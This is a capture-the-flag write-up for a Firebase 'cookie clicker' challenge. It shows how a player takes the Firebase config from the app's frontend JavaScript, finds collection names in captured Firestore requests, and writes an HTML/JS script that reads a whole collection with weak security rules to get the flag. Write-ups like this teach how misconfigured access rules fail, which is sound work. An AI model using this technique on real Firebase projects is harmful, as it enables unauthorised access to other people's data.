# Writeup

This challenge essentially was to try and exploit the rules set on the Firestore instance in firebase which determine what data users are able to CRUD.

Once the user signs up there is a cookie they can click which tracks the amount of click they have clicked the cookie but also how mnay times the cookie has been clicked in general. 

Since this is using Firebase, the credentials for the API are embeded in the frontend. This is an Angular Frontend running in development mode, so to get the creds we inspect the page navigate to `sources` and then `main.js`. This is where all the customer Angular code is located, a quick CTRL+F for firebase gives us the API creds: 

```
const environment = {
    production: false,
    firebase: {
        apiKey: "AIzaSyDOCn4NThEqv9Y-afv36PfJWBUYiGm1rkI",
        authDomain: "cookie-clicker1.firebaseapp.com",
        databaseURL: "https://cookie-clicker1.firebaseio.com",
        projectId: "cookie-clicker1",
        storageBucket: "cookie-clicker1.appspot.com",
        messagingSenderId: "186649534277",
        appId: "1:186649534277:web:a75d541debbd366cebe82c",
        measurementId: "G-7LWV67HSXP"
    }
};
```

Now we can use this to create our own webpage to access the Firestore. But first we need to find out what collections are available. For this we inspect the requests that we are sending any time that we update the cookie clicker.

```
req0___data__: {"streamToken":"EAEZEGhCAoH0tbU=","writes":[{"update":{"name":"projects/cookie-clicker1/databases/(default)/documents/users/uAdLUzHBvhcTvjsKh1Pb5RzvT6m2","fields":{}},"updateMask":{"fieldPaths":[]}},{"transform":{"document":"projects/cookie-clicker1/databases/(default)/documents/users/uAdLUzHBvhcTvjsKh1Pb5RzvT6m2","fieldTransforms":[{"fieldPath":"cookieCount","increment":{"integerValue":"1"}}]},"currentDocument":{"exists":true}},{"update":{"name":"projects/cookie-clicker1/databases/(default)/documents/cookies/total","fields":{}},"updateMask":{"fieldPaths":[]}},{"transform":{"document":"projects/cookie-clicker1/databases/(default)/documents/cookies/total","fieldTransforms":[{"fieldPath":"cookieCount","increment":{"integerValue":"1"}}]},"currentDocument":{"exists":true}}]}
```

So this doesn't make that much sense, but if we have a look through it we can see 2 collections it is querying:

`projects/cookie-clicker1/databases/(default)/documents/cookies/total`
`projects/cookie-clicker1/databases/(default)/documents/users/uAdLUzHBvhcTvjsKh1Pb5RzvT6m2`

So the two collections here are `cookies` and `users`. So let's see what data we can access here. We create our own html file with script tags to interact with the db.


```
<html>
    <head>
    <!-- Import Firebase Scripts -->
        <script src="https://www.gstatic.com/firebasejs/7.19.1/firebase-app.js"></script>
        <script src="https://www.gstatic.com/firebasejs/7.19.1/firebase-firestore.js"></script>
        <script src="https://www.gstatic.com/firebasejs/7.19.1/firebase-auth.js"></script>
    </head>
</html>

<body>
    <script>
        var firebaseConfig = {
            apiKey: "AIzaSyDOCn4NThEqv9Y-afv36PfJWBUYiGm1rkI",
            authDomain: "cookie-clicker1.firebaseapp.com",
            databaseURL: "https://cookie-clicker1.firebaseio.com",
            projectId: "cookie-clicker1",
            storageBucket: "cookie-clicker1.appspot.com",
            messagingSenderId: "186649534277",
            appId: "1:186649534277:web:a75d541debbd366cebe82c",
            measurementId: "G-7LWV67HSXP"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        async function win() {
            // Login with auth
            await firebase.auth().signInWithEmailAndPassword("test@email.com", "samsamsam")
            
            const citiesRef = db.collection('cookies');
            const snapshot = await citiesRef.get();
            
            if (snapshot.empty) {
                console.log('No matching documents.');
                return;
            }  

            snapshot.forEach(doc => {
                console.log(doc.id, '=>', doc.data());
            });

        }
        win();
        

        </script>
</body>
```


This script will login to firebase with our created credentials, and then query the `cookies` collection for all the documents. Hosting this using a simple `python -m http.server 8080` and accessing the page we get the output

```
notaflag => {flag: "DUCTF{ok_it_is_a_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}"}
```

Note, we could also query the users collection but we would find that we can only get data from our own user.
